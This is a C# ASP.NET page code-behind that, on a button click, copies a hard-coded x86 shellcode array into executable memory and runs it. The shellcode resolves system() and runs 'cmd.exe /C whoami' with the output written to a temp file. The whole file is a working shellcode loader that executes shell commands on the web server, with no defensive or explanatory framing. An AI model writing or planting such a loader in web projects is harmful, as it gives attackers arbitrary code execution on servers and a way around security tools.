using System;
using System.Collections.Generic;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Runtime.InteropServices;
using System.IO;

public partial class _Default : System.Web.UI.Page
{
    delegate int ShellCodeFunc(int value, char[] str1, char[] str2);

    [DllImport("Kernel32.dll", EntryPoint = "VirtualAlloc")]
    public static extern IntPtr VirtualAlloc(IntPtr address, int size, uint allocType, uint protect);

    [DllImport("Kernel32.dll", EntryPoint = "LoadLibraryA")]
    public static extern int LoadLibraryA(char[] lpLibFileName);

    [DllImport("Kernel32.dll", EntryPoint = "VirtualFree")]
    public static extern bool VirtualFree(IntPtr address, int size, uint freeType);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint MEM_RELEASE = 0x8000;
    protected void Page_Load(object sender, EventArgs e)
    {

    }

    protected void btn_Run_Click(object sender, EventArgs e)
    {
        byte[] shell_code = { 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x48, 0xC7, 0x45, 0xFC, 0x64, 0x00, 0x00, 0x00, 0x66, 0x8B, 0x45, 0xFC, 0x66, 0x83, 0xC0, 0x01, 0x66, 0x89, 0x45, 0xFC, 0x8B, 0x55, 0x08, 0x8D, 0x45, 0xEC, 0x50, 0xC7, 0x45, 0xEC, 0x4C, 0x6F, 0x61, 0x64, 0xC7, 0x45, 0xF0, 0x4C, 0x69, 0x62, 0x72, 0xC7, 0x45, 0xF4, 0x61, 0x72, 0x79, 0x41, 0xC6, 0x45, 0xF8, 0x00, 0xE8, 0x8E, 0x00, 0x00, 0x00, 0x8D, 0x4D, 0xE0, 0x51, 0xC7, 0x45, 0xE0, 0x63, 0x72, 0x74, 0x64, 0xC7, 0x45, 0xE4, 0x6C, 0x6C, 0x2E, 0x64, 0x66, 0xC7, 0x45, 0xE8, 0x6C, 0x6C, 0xC6, 0x45, 0xEA, 0x00, 0xC7, 0x45, 0xF0, 0x73, 0x79, 0x73, 0x74, 0x66, 0xC7, 0x45, 0xF4, 0x65, 0x6D, 0xC6, 0x45, 0xF6, 0x00, 0xC7, 0x45, 0xB8, 0x63, 0x6D, 0x64, 0x2E, 0xC7, 0x45, 0xBC, 0x65, 0x78, 0x65, 0x20, 0xC7, 0x45, 0xC0, 0x2F, 0x43, 0x20, 0x77, 0xC7, 0x45, 0xC4, 0x68, 0x6F, 0x61, 0x6D, 0xC7, 0x45, 0xC8, 0x69, 0x20, 0x3E, 0x20, 0xC7, 0x45, 0xCC, 0x43, 0x3A, 0x5C, 0x54, 0xC7, 0x45, 0xD0, 0x65, 0x6D, 0x70, 0x5C, 0xC7, 0x45, 0xD4, 0x5C, 0x74, 0x65, 0x73, 0xC7, 0x45, 0xD8, 0x74, 0x2E, 0x74, 0x78, 0x66, 0xC7, 0x45, 0xDC, 0x74, 0x00, 0xFF, 0xD0, 0x8D, 0x4D, 0xB8, 0x51, 0x8D, 0x4D, 0xF0, 0x51, 0x8B, 0xD0, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x0F, 0xBF, 0x45, 0xFC, 0x59, 0xC9, 0xC2, 0x0C, 0x00, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x1C, 0x8B, 0x42, 0x3C, 0x8B, 0x4C, 0x10, 0x78, 0x83, 0x65, 0xE4, 0x00, 0x83, 0x65, 0xFC, 0x00, 0x53, 0x03, 0xCA, 0x8B, 0x59, 0x1C, 0x8B, 0x41, 0x18, 0x56, 0x8B, 0x71, 0x20, 0x57, 0x8B, 0x79, 0x24, 0x8B, 0x49, 0x14, 0x03, 0xDA, 0x03, 0xFA, 0x03, 0xF2, 0x89, 0x45, 0xF0, 0x89, 0x4D, 0xE8, 0x85, 0xC0, 0x74, 0x4D, 0x8B, 0x45, 0xFC, 0x0F, 0xBF, 0x0C, 0x47, 0x89, 0x4D, 0xEC, 0x3B, 0x45, 0xF0, 0x73, 0x52, 0x8B, 0x45, 0xE8, 0x3B, 0xC8, 0x73, 0x4B, 0x8B, 0x45, 0xFC, 0x8B, 0x04, 0x86, 0x8B, 0x4D, 0x08, 0x03, 0xC2, 0x89, 0x45, 0xF8, 0x8A, 0x00, 0x3A, 0x01, 0x75, 0x0D, 0x84, 0xC0, 0x74, 0x29, 0xFF, 0x45, 0xF8, 0x8B, 0x45, 0xF8, 0x41, 0xEB, 0xED, 0x3B, 0x4D, 0xF8, 0x1B, 0xC0, 0x83, 0xE0, 0x02, 0x48, 0x74, 0x15, 0xFF, 0x45, 0xFC, 0x8B, 0x45, 0xFC, 0x3B, 0x45, 0xF0, 0x72, 0xB3, 0x8B, 0x45, 0xE4, 0x5F, 0x5E, 0x5B, 0xC9, 0xC2, 0x04, 0x00, 0x8B, 0x45, 0xEC, 0x8B, 0x04, 0x83, 0x03, 0xC2, 0xEB, 0xEF, 0x33, 0xC0, 0xEB, 0xEB, 0x00 };
        IntPtr handle = VirtualAlloc(IntPtr.Zero, shell_code.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        try
        {
            int value = LoadLibraryA("kernel32.dll".ToCharArray());
            Response.Write(value);
            Marshal.Copy(shell_code, 0, handle, shell_code.Length);
            ShellCodeFunc shell_code_func = Marshal.GetDelegateForFunctionPointer(handle, typeof(ShellCodeFunc)) as ShellCodeFunc;
            int result = shell_code_func(value, "Hello world !".ToCharArray(), "test string".ToCharArray());

            Response.Write(string.Format("Result:{0}", result));
        } // end try
        catch (Exception ex)
        {
            Response.Write(ex.Message);
        } // end catch
        finally
        {
            VirtualFree(handle, 0, MEM_RELEASE);
        } // end finally
    }
}